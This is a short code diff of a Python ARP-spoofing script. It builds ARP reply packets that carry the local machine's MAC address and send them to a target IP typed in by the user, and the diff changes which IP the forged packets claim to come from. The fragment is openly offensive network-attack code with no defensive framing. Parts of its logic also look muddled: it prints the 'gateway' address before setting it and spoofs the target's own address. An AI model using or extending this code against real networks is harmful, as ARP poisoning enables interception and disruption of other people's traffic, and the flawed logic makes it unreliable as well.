@@ -13,19 +13,14 @@ def print_ascii_art():
     print(art)
 def main():
     print_ascii_art()
-    local_ip = get_if_addr(conf.iface)
-    ip_parts = local_ip.split(".")
-    ga_ip = f"{ip_parts[0]}.{ip_parts[1]}.255.255"
-
     arp_packet = ARP()
-    arp_packet.psrc = ga_ip
     arp_packet.hwsrc = get_if_hwaddr(conf.iface) 
-    
     print("GateAway IP:", arp_packet.psrc)
     print("Source MAC address:", arp_packet.hwsrc)
 
     target_ip = input("Enter target IP: ")
-    arp_packet.pdst = target_ip  
+    arp_packet.pdst = target_ip 
+    arp_packet.psrc = target_ip
     arp_packet.op = 2 
 
     try:
